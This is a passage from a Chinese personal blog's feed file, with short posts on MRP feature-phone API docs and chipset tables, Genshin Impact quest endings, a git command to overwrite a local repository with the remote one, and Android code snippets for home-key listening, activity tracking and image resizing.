href="mr_plat(1217).htm"><i class="fa fa-file-text-o" aria-hidden="true"></i> mr_plat(1217) - 退出天气预报</a></li><li><a href="mr_platEx(5015).htm"><i class="fa fa-file-text-o" aria-hidden="true"></i> mr_platEx(5015) - 获得天气信息</a></li><li><a href="mr_platEx(5016).htm"><i class="fa fa-file-text-o" aria-hidden="true"></i> mr_platEx(5016) - 进入天气预报</a></li><li><a href="mr_platEx(5017).htm"><i class="fa fa-file-text-o" aria-hidden="true"></i> mr_platEx(5017) - 退出天气预报</a></li><li><a href="mr_platEx(5018).htm"><i class="fa fa-file-text-o" aria-hidden="true"></i> mr_platEx(5018) - 获取天气通知</a></li><li><a href="mr_platEx(5019).htm"><i class="fa fa-file-text-o" aria-hidden="true"></i> mr_platEx(5019) - 获取天气桌面信息</a></li></ul></details></li><li><details><summary><i class="fa fa-book" aria-hidden="true"></i> 其他未归类接口</summary><ul><li><a href="mr_plat(1211).htm"><i class="fa fa-file-text-o" aria-hidden="true"></i> mr_plat(1211) - 生成随机数</a></li><li><a href="mr_plat(1325).htm"><i class="fa fa-file-text-o" aria-hidden="true"></i> mr_plat(1325) - 绘制主菜单背景</a></li><li><a href="mr_plat(1333).htm"><i class="fa fa-file-text-o" aria-hidden="true"></i> mr_plat(1333) - 进入TODO LIST</a></li><li><a href="mr_platEx(1207).htm"><i class="fa fa-file-text-o" aria-hidden="true"></i> mr_platEx(1207) - UNICODE 转 GB</a></li></ul></details></li></ul></details></li><li><details><summary><i class="fa fa-book" aria-hidden="true"></i> 附录</summary><ul><li><a href="$$unsavedpage.htm"><i class="fa fa-file-text-o" aria-hidden="true"></i> 系统常量定义</a></li><li><a href="$$unsavedpage.htm"><i class="fa fa-file-text-o" aria-hidden="true"></i> 系统类型定义</a></li><li><a href="平台版本号规则.htm"><i class="fa fa-file-text-o" aria-hidden="true"></i> 平台版本号规则</a></li><li><a href="接口跟踪表.htm"><i class="fa fa-file-text-o" aria-hidden="true"></i> 接口跟踪表</a></li><li><a href="接口平台实现一览表.htm"><i class="fa fa-file-text-o" aria-hidden="true"></i> 接口平台实现一览表</a></li><li><a href="$$unsavedpage.htm"><i class="fa fa-file-text-o" aria-hidden="true"></i> 发布记录</a></li></ul></details></li><li><details><summary><i class="fa fa-book" aria-hidden="true"></i> FAQ</summary><ul><li><a href="$$unsavedpage.htm"><i class="fa fa-file-text-o" aria-hidden="true"></i> MTK平台如何添加菜单</a></li><li><a href="$$unsavedpage.htm"><i class="fa fa-file-text-o" aria-hidden="true"></i> 什么叫固化及多入口</a></li></ul></details></li></ul><p>所有带 <i class="fa fa-book" aria-hidden="true"></i> 的标题均可点击展开</p><p><a href="SKYENGINE-API.chm">当前文档下载</a>  </p><p>其他文档、开发环境可以前往 <a href="http://sohehe4.ysepan.com/" target="_blank" rel="noopener">http://sohehe4.ysepan.com/</a> 或 <a href="https://github.com/vmrp/mrpdev" target="_blank" rel="noopener">https://github.com/vmrp/mrpdev</a> 下载查看</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>云堇 邀约任务</title>
      <link href="/2022/yun-jin-yao-yue-ren-wu/"/>
      <url>/2022/yun-jin-yao-yue-ren-wu/</url>
      
        <content type="html"><![CDATA[<p>云堇的邀约任务「意趣合入画喜相逢」倒是给了个惊喜，在这里记录下所有结局。  </p><a id="more"></a>  <p>第一幕 弦歌知雅意</p><p><img src="/img/preloader.gif" data-original="https://gcore.jsdelivr.net/gh/gddhy/blog-res/yuanshen/yunjin/20221125161219.png" alt="img"><br>只可叹世路风波险<br>看来云堇会有好一段时间刚忙了…  </p><p><img src="/img/preloader.gif" data-original="https://gcore.jsdelivr.net/gh/gddhy/blog-res/yuanshen/yunjin/20221125161245.png" alt="img"><br>更难得人海觅知音<br>摩拉百万容易得，知己一个也难求。  </p><p><img src="/img/preloader.gif" data-original="https://gcore.jsdelivr.net/gh/gddhy/blog-res/yuanshen/yunjin/20221125161257.png" alt="img"><br>意趣合入画喜相逢<br>留一张合影，留一段想念。  </p><p><img src="/img/preloader.gif" data-original="https://gcore.jsdelivr.net/gh/gddhy/blog-res/yuanshen/yunjin/2022112516139.png" alt="img"><br>不投机无缘空留念<br>真正值得纪念的，或许不是一张签名画片…  </p><p><img src="/img/preloader.gif" data-original="https://gcore.jsdelivr.net/gh/gddhy/blog-res/yuanshen/yunjin/20221125161318.png" alt="img"><br>戏中人初窥戏中意<br>为了来日一同登台，再花些时间一起练戏吧。</p>]]></content>
      
      
      
        <tags>
            
            <tag> 原神 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>mrp根据移植版本判断平台</title>
      <link href="/2022/mrp-ping-tai-jian-bie/"/>
      <url>/2022/mrp-ping-tai-jian-bie/</url>
      
        <content type="html"><![CDATA[<p>记录下mrp上移植版本与cpu的对应关系  </p><a id="more"></a>  <p>一般移植版本第四位第五位表示芯片组类型</p><table><thead><tr><th align="center">MTK平台芯片套系</th><th align="center">平台内标识</th></tr></thead><tbody><tr><td align="center">MT6219</td><td align="center">1</td></tr><tr><td align="center">MT6223P / MT6223 / MT6223P_S00</td><td align="center">2</td></tr><tr><td align="center">MT6225</td><td align="center">3</td></tr><tr><td align="center">MT6226 / MT6226M / MT6226D</td><td align="center">4</td></tr><tr><td align="center">MT6228</td><td align="center">5</td></tr><tr><td align="center">MT6230</td><td align="center">6</td></tr><tr><td align="center">MT6227 / MT6227D</td><td align="center">7</td></tr><tr><td align="center">MT6235</td><td align="center">8</td></tr><tr><td align="center">MT6229</td><td align="center">9</td></tr><tr><td align="center">MT6253B</td><td align="center">10</td></tr><tr><td align="center">MT6238</td><td align="center">11</td></tr><tr><td align="center">MT6239</td><td align="center">12</td></tr><tr><td align="center">MT6268</td><td align="center">13</td></tr><tr><td align="center">MT6236</td><td align="center">14</td></tr><tr><td align="center">MT6252</td><td align="center">15</td></tr><tr><td align="center">MT6276</td><td align="center">16</td></tr><tr><td align="center">MT6255</td><td align="center">17</td></tr><tr><td align="center">MT6250</td><td align="center">19</td></tr><tr><td align="center">MT6261</td><td align="center">21</td></tr></tbody></table><table><thead><tr><th align="center">展讯平台芯片套系</th><th align="center">平台内标识</th></tr></thead><tbody><tr><td align="center">6600d</td><td align="center">1</td></tr><tr><td align="center">6600m</td><td align="center">2</td></tr><tr><td align="center">rocky</td><td align="center">3</td></tr><tr><td align="center">nile</td><td align="center">4</td></tr><tr><td align="center">6600h</td><td align="center">5</td></tr><tr><td align="center">mocor</td><td align="center">6</td></tr><tr><td align="center">6600L</td><td align="center">7</td></tr><tr><td align="center">6530</td><td align="center">9</td></tr></tbody></table><table><thead><tr><th align="center">MSTAR平台芯片套系</th><th align="center">平台内标识</th></tr></thead><tbody><tr><td align="center">8528</td><td align="center">1</td></tr><tr><td align="center">8535</td><td align="center">2</td></tr><tr><td align="center">8538</td><td align="center">3</td></tr></tbody></table><p>表格内容来自斯凯API文档和平常闲鱼收到的功能机整理</p><p>附. 斯凯API文档相关部分<br><a href="平台版本号规则.htm">平台版本号规则</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>早柚 邀约任务</title>
      <link href="/2022/zao-you-yao-yue-ren-wu/"/>
      <url>/2022/zao-you-yao-yue-ren-wu/</url>
      
        <content type="html"><![CDATA[<p>邀约任务刚上线时做过，不过当时一个任务所有结局没做完就没继续做了，当时感觉有点长，选错了支线还要从头来过，就一直没去做，最近缺原石，就又把这邀约任务拾起来了，感觉早柚好戳我。  </p><a id="more"></a>  <p>记录一下早柚邀约任务结局  </p><p>第一幕  呜呼流•生长之术</p><p><img src="/img/preloader.gif" data-original="https://gcore.jsdelivr.net/gh/gddhy/blog-res/yuanshen/zaoyou/2022111916372.png" alt="img"><br>凡事都需节制<br>「逃脱」对早柚来说如同家常便饭，但这次她失手了。   </p><p><img src="/img/preloader.gif" data-original="https://gcore.jsdelivr.net/gh/gddhy/blog-res/yuanshen/zaoyou/20221119163734.png" alt="img"><br>如在天际翱翔<br>虽然长高之事并不顺利，但至少你能让她看到未来的风景。  </p><p><img src="/img/preloader.gif" data-original="https://gcore.jsdelivr.net/gh/gddhy/blog-res/yuanshen/zaoyou/20221119163753.png" alt="img"><br>早柚绝不工作！<br>既然怎么都藏不住，那就只能靠速度了！    </p><p><img src="/img/preloader.gif" data-original="https://gcore.jsdelivr.net/gh/gddhy/blog-res/yuanshen/zaoyou/2022111916384.png" alt="img"><br>与树同行<br>稍微有点理解她的想法了，终有一天，她能够回应所有的期待吧。  </p><p><img src="/img/preloader.gif" data-original="https://gcore.jsdelivr.net/gh/gddhy/blog-res/yuanshen/zaoyou/20221119163817.png" alt="img"><br>最安稳的休憩<br>辛劳之后的休憩最为甘甜，你见证了她的努力，此时就再多守护她一会儿吧。</p><p><img src="/img/preloader.gif" data-original="https://gcore.jsdelivr.net/gh/gddhy/blog-res/yuanshen/zaoyou/20221119163828.png" alt="img"><br>小小早柚之烦恼<br>每个人都要在烦恼中学习如何与世界相处，早柚也不例外…</p>]]></content>
      
      
      
        <tags>
            
            <tag> 原神 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>git远程仓库覆盖本地仓库</title>
      <link href="/2022/git-yuan-cheng-cang-ku-fu-gai-ben-di-cang-ku/"/>
      <url>/2022/git-yuan-cheng-cang-ku-fu-gai-ben-di-cang-ku/</url>
      
        <content type="html"><![CDATA[<figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git fetch --all &amp;&amp;  git reset --hard origin/<span class="keyword">master</span> <span class="title">&amp;&amp; git</span> pull</span><br></pre></td></tr></table></figure><a id="more"></a><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git <span class="keyword">fetch</span> <span class="comment">--all</span></span><br><span class="line">git <span class="keyword">reset</span> <span class="comment">--hard origin/master</span></span><br><span class="line">git pull</span><br></pre></td></tr></table></figure><p>复制时注意仓库分支</p>]]></content>
      
      
      
        <tags>
            
            <tag> git </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>功能机常见机分辨率</title>
      <link href="/2022/gong-neng-ji-chang-jian-ji-fen-bian-lu/"/>
      <url>/2022/gong-neng-ji-chang-jian-ji-fen-bian-lu/</url>
      
        <content type="html"><![CDATA[<p>找了下以前MTK功能机常见的分辨率，应该480*800就是当时最大的了  </p><a id="more"></a>  <table><thead><tr><th align="center"></th><th align="center">分辨率</th></tr></thead><tbody><tr><td align="center"></td><td align="center">128x160</td></tr><tr><td align="center">Sub-QVGA</td><td align="center">176x220</td></tr><tr><td align="center">QVGA</td><td align="center">240x320</td></tr><tr><td align="center">WQVGA</td><td align="center">240x400</td></tr><tr><td align="center">WQVGA</td><td align="center">272x480</td></tr><tr><td align="center">SQVGA</td><td align="center">320x320</td></tr><tr><td align="center">HVGA</td><td align="center">320x480</td></tr><tr><td align="center">nHD</td><td align="center">360x640</td></tr><tr><td align="center">SQVGA</td><td align="center">480x480</td></tr><tr><td align="center">VGA</td><td align="center">480x640</td></tr><tr><td align="center">WVGA</td><td align="center">480x800</td></tr><tr><td align="center">FWVGA</td><td align="center">480*854</td></tr></tbody></table>]]></content>
      
      
      
        <tags>
            
            <tag> mtk </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>打开安卓原生默认桌面设置</title>
      <link href="/2022/da-kai-an-zhuo-yuan-sheng-mo-ren-zhuo-mian-she-zhi/"/>
      <url>/2022/da-kai-an-zhuo-yuan-sheng-mo-ren-zhuo-mian-she-zhi/</url>
      
        <content type="html"><![CDATA[<figure class="highlight fortran"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Intent</span> <span class="keyword">intent</span> = new <span class="keyword">Intent</span>(Settings.ACTION_HOME_SETTINGS);</span><br><span class="line">startActivity(<span class="keyword">intent</span>);</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>安卓监听home键点击</title>
      <link href="/2022/an-zhuo-jian-ting-home-jian-dian-ji/"/>
      <url>/2022/an-zhuo-jian-ting-home-jian-dian-ji/</url>
      
        <content type="html"><![CDATA[<p>创建一个广播接收器  </p><a id="more"></a>  <figure class="highlight scala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">InnerRecevier</span> <span class="keyword">extends</span> <span class="title">BroadcastReceiver</span> </span>&#123;</span><br><span class="line">        <span class="keyword">final</span> <span class="type">String</span> <span class="type">SYSTEM_DIALOG_REASON_KEY</span> = <span class="string">"reason"</span>;</span><br><span class="line">        <span class="keyword">final</span> <span class="type">String</span> <span class="type">SYSTEM_DIALOG_REASON_RECENT_APPS</span> = <span class="string">"recentapps"</span>;</span><br><span class="line">        <span class="keyword">final</span> <span class="type">String</span> <span class="type">SYSTEM_DIALOG_REASON_HOME_KEY</span> = <span class="string">"homekey"</span>;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        public void onReceive(<span class="type">Context</span> context, <span class="type">Intent</span> intent) &#123;</span><br><span class="line">            <span class="type">String</span> action = intent.getAction();</span><br><span class="line">            <span class="keyword">if</span> (<span class="type">Intent</span>.<span class="type">ACTION_CLOSE_SYSTEM_DIALOGS</span>.equals(action)) &#123;</span><br><span class="line">                <span class="type">String</span> reason = intent.getStringExtra(<span class="type">SYSTEM_DIALOG_REASON_KEY</span>);</span><br><span class="line">                <span class="keyword">if</span> (reason != <span class="literal">null</span>) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (reason.equals(<span class="type">SYSTEM_DIALOG_REASON_HOME_KEY</span>)) &#123;</span><br><span class="line">                        <span class="type">Toast</span>.makeText(<span class="type">MainActivity</span>.<span class="keyword">this</span>, <span class="string">"Home键被监听"</span>, <span class="type">Toast</span>.<span class="type">LENGTH_SHORT</span>).show();</span><br><span class="line">                    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (reason.equals(<span class="type">SYSTEM_DIALOG_REASON_RECENT_APPS</span>)) &#123;</span><br><span class="line">                        <span class="type">Toast</span>.makeText(<span class="type">MainActivity</span>.<span class="keyword">this</span>, <span class="string">"多任务键被监听"</span>, <span class="type">Toast</span>.<span class="type">LENGTH_SHORT</span>).show();</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>在Activity中的onCreate()方法中注册广播</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">@Override</span><br><span class="line">protected void on<span class="constructor">Create(Bundle <span class="params">savedInstanceState</span>)</span> &#123;</span><br><span class="line">    super.on<span class="constructor">Create(<span class="params">savedInstanceState</span>)</span>;</span><br><span class="line">    set<span class="constructor">ContentView(R.<span class="params">layout</span>.<span class="params">activity_main</span>)</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//创建广播</span></span><br><span class="line">    InnerRecevier innerReceiver = <span class="keyword">new</span> <span class="constructor">InnerRecevier()</span>;</span><br><span class="line">    <span class="comment">//动态注册广播</span></span><br><span class="line">    IntentFilter intentFilter = <span class="keyword">new</span> <span class="constructor">IntentFilter(Intent.ACTION_CLOSE_SYSTEM_DIALOGS)</span>;</span><br><span class="line">    <span class="comment">//启动广播</span></span><br><span class="line">    register<span class="constructor">Receiver(<span class="params">innerReceiver</span>, <span class="params">intentFilter</span>)</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上面代码即可实现对home键、多任务键进行监听，但是无法屏蔽系统的行为</p><blockquote><p>转载自 <a href="https://blog.csdn.net/Abrazen_zz/article/details/53288151" target="_blank" rel="noopener">https://blog.csdn.net/Abrazen_zz/article/details/53288151</a> </p></blockquote>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>如何判断Activity是否在运行？</title>
      <link href="/2022/ru-he-pan-duan-activity-shi-fou-zai-yun-xing/"/>
      <url>/2022/ru-he-pan-duan-activity-shi-fou-zai-yun-xing/</url>
      
        <content type="html"><![CDATA[<p>定义ActivityCollector  </p><a id="more"></a>  <figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> android.annotation.TargetApi;</span><br><span class="line"><span class="keyword">import</span> android.app.Activity;</span><br><span class="line"><span class="keyword">import</span> android.os.Build;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.LinkedHashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map.Entry;</span><br><span class="line"><span class="keyword">import</span> java.util.Set;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Author: jack</span></span><br><span class="line"><span class="comment"> * Description:管理所有的栈中的Activity</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ActivityCollector</span> &#123;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 存放activity的列表</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> HashMap&lt;Class&lt;?&gt;, Activity&gt; activities = <span class="keyword">new</span> LinkedHashMap&lt;&gt;();</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 添加Activity</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * @param activity</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">addActivity</span><span class="params">(Activity activity, Class&lt;?&gt; clz)</span> </span>&#123;</span><br><span class="line">        activities.<span class="built_in">put</span>(clz, activity);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 判断一个Activity 是否存在</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * @param clz</span></span><br><span class="line"><span class="comment">     * @return</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    @TargetApi(Build.VERSION_CODES.JELLY_BEAN_MR1)</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> &lt;T extends Activity&gt; <span class="function"><span class="keyword">boolean</span> <span class="title">isActivityExist</span><span class="params">(Class&lt;T&gt; clz)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">boolean</span> res;</span><br><span class="line">        Activity activity = getActivity(clz);</span><br><span class="line">        <span class="keyword">if</span> (activity == null) &#123;</span><br><span class="line">            res = <span class="literal">false</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (activity.isFinishing() || activity.isDestroyed()) &#123;</span><br><span class="line">                res = <span class="literal">false</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                res = <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 获得指定activity实例</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * @param clazz Activity 的类对象</span></span><br><span class="line"><span class="comment">     * @return</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> &lt;T extends Activity&gt; <span class="function">T <span class="title">getActivity</span><span class="params">(Class&lt;T&gt; clazz)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> (T) activities.<span class="built_in">get</span>(clazz);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 移除activity,代替finish</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * @param activity</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">removeActivity</span><span class="params">(Activity activity)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (activities.containsValue(activity)) &#123;</span><br><span class="line">            activities.<span class="built_in">remove</span>(activity.getClass());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 移除所有的Activity</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">removeAllActivity</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (activities != null &amp;&amp; activities.<span class="built_in">size</span>() &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            Set&lt;Entry&lt;Class&lt;?&gt;, Activity&gt;&gt; sets = activities.entrySet();</span><br><span class="line">            <span class="keyword">for</span> (Entry&lt;Class&lt;?&gt;, Activity&gt; s : sets) &#123;</span><br><span class="line">                <span class="keyword">if</span> (!s.getValue().isFinishing()) &#123;</span><br><span class="line">                    s.getValue().finish();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        activities.<span class="built_in">clear</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在 App中的BaseActivity中</p><figure class="highlight scala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">public  <span class="class"><span class="keyword">class</span> <span class="title">BaseActivity</span> <span class="keyword">extends</span> <span class="title">Activity</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> void onCreate(<span class="type">Bundle</span> savedInstanceState) &#123;</span><br><span class="line">        <span class="keyword">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        <span class="type">ActivityCollector</span>.addActivity(<span class="keyword">this</span>, getClass());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> void onDestroy() &#123;</span><br><span class="line">        <span class="keyword">super</span>.onDestroy();</span><br><span class="line">        <span class="type">ActivityCollector</span>.removeActivity(<span class="keyword">this</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后所有的Activity都去继承 BaseActvity 就可以使 ActivityCollector起作用了。</p><p><strong>好处</strong></p><p>在应用的任何地方都可以去获取到 Activity实例,从而操作指定的 View对象</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">MainActivity mainActivity = <span class="module-access"><span class="module"><span class="identifier">ActivityCollector</span>.</span></span>get<span class="constructor">Activity(MainActivity.<span class="params">class</span>)</span>;</span><br><span class="line"><span class="keyword">if</span> (mainActivity!=null) mainActivity.main_radio.check(<span class="module-access"><span class="module"><span class="identifier">R</span>.</span></span>id.radio_button1);</span><br></pre></td></tr></table></figure><p>判断一个 Activity是否存在</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="module-access"><span class="module"><span class="identifier">ActivityCollector</span>.</span></span>is<span class="constructor">ActivityExist(MainActivity.<span class="params">class</span>)</span>;</span><br></pre></td></tr></table></figure><blockquote><p>转载自 <a href="https://www.jianshu.com/p/e46b843b95f4" target="_blank" rel="noopener">https://www.jianshu.com/p/e46b843b95f4</a> </p></blockquote><p>适合每个Activity只有一个实例的，方便管理</p><p>可以在AndroidManifest中指定Activity的启动方式</p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">android:</span>launchMode=<span class="string">"singleTop"</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>ImageView高度自适应</title>
      <link href="/2022/imageview-gao-du-zi-gua-ying/"/>
      <url>/2022/imageview-gao-du-zi-gua-ying/</url>
      
        <content type="html"><![CDATA[<p>方法来自 ImageView宽度填满屏幕，高度自适应  </p><blockquote><p><a href="https://blog.csdn.net/easion_zms/article/details/50263409" target="_blank" rel="noopener">https://blog.csdn.net/easion_zms/article/details/50263409</a>  </p></blockquote><a id="more"></a>  <figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">public <span class="keyword">class</span> ResizableImageView extends ImageView &#123;</span><br><span class="line"> </span><br><span class="line">    public <span class="constructor">ResizableImageView(Context <span class="params">context</span>)</span> &#123;</span><br><span class="line">        super(context);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    public <span class="constructor">ResizableImageView(Context <span class="params">context</span>, AttributeSet <span class="params">attrs</span>)</span> &#123;</span><br><span class="line">        super(context, attrs);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    @Override</span><br><span class="line">    protected void on<span class="constructor">Measure(<span class="params">int</span> <span class="params">widthMeasureSpec</span>, <span class="params">int</span> <span class="params">heightMeasureSpec</span>)</span>&#123;</span><br><span class="line">        Drawable d = get<span class="constructor">Drawable()</span>;</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">if</span>(d!=null)&#123;</span><br><span class="line">            <span class="comment">// ceil not round - avoid thin vertical gaps along the left/right edges</span></span><br><span class="line">            <span class="built_in">int</span> width = <span class="module-access"><span class="module"><span class="identifier">MeasureSpec</span>.</span></span>get<span class="constructor">Size(<span class="params">widthMeasureSpec</span>)</span>;</span><br><span class="line">            <span class="comment">//高度根据使得图片的宽度充满屏幕计算而得</span></span><br><span class="line">            <span class="built_in">int</span> height = (<span class="built_in">int</span>) <span class="module-access"><span class="module"><span class="identifier">Math</span>.</span></span>ceil((<span class="built_in">float</span>) width<span class="operator"> * </span>(<span class="built_in">float</span>) 